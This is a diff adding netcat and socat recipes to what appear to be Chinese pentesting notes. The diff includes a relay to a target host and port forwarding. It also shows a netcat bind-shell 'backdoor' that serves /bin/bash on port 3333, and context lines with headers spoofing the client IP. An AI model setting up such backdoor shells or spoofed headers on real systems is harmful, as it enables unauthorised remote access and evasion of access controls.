@@ -7,3 +7,40 @@ X-Forwarded-For: 127.0.0.1		# 伪装ip
 X-Client-IP: 127.0.0.1			# 伪装ip
 Client-IP: 127.0.0.1			  # 伪装ip
 ```
+
+### 常用工具
+
+- nc
+
+	- 代理
+		```bash
+		$ mkfifo fifo
+		$ nc -l 3333 0<fifo | nc target_ip target_port 1>fifo
+		```
+	- 创建后门
+		```bash
+		# 服务端
+		$ nc -l 3333 -e /bin/bash
+
+		# 客户端
+		$nc target_ip 3333
+		```
+	- 端口转发
+		```bash
+		# 所有连接到 80 端口的连接都会转发到 8080 端口。
+		$ nc -u -l  80 -c  'nc -u -l 8080'
+		```
+
+- ssh
+
+- socat
+
+	- 端口转发
+	```bash
+	$socat TCP-LISTEN:4040,reuseaddr, fork TCP:localhost：4000
+	```
+
+### 参考
+
+> [实战 SSH端口转发](https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/)
+
